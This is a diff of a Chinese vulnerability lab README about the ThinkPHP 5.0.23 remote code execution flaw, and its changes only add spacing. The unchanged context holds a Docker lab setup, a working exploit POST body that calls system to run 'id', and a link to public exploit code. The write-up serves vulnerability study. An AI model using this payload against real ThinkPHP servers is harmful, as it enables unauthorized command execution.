@@ -2,7 +2,7 @@
 
 ## 漏洞描述
 
-ThinkPHP是一款运用极广的PHP开发框架。其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。
+ThinkPHP 是一款运用极广的 PHP 开发框架。其 5.0.23 以前的版本中，获取 method 的方法中没有正确处理方法名，导致攻击者可以调用 Request 类任意方法并构造利用链，从而导致远程代码执行漏洞。
 
 参考链接：
 
@@ -10,13 +10,13 @@ ThinkPHP是一款运用极广的PHP开发框架。其5.0.23以前的版本中，
 
 ## 环境搭建
 
-执行如下命令启动一个默认的thinkphp 5.0.23环境：
+执行如下命令启动一个默认的 thinkphp 5.0.23 环境：
 
 ```
 docker-compose up -d
 ```
 
-环境启动后，访问`http://your-ip:8080/index.php`即可看到默认的ThinkPHP启动页面。
+环境启动后，访问 `http://your-ip:8080/index.php` 即可看到默认的 ThinkPHP 启动页面。
 
 ## 漏洞复现
 
@@ -36,10 +36,10 @@ Content-Length: 72
 _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
 ```
 
-成功执行`id`命令：
+成功执行 `id` 命令：
 
 ![image-20220302151553822](images/202203021515902.png)
 
-## 开源POC/EXP
+## 开源 POC/EXP
 
 - https://github.com/sukabuliet/ThinkphpRCE
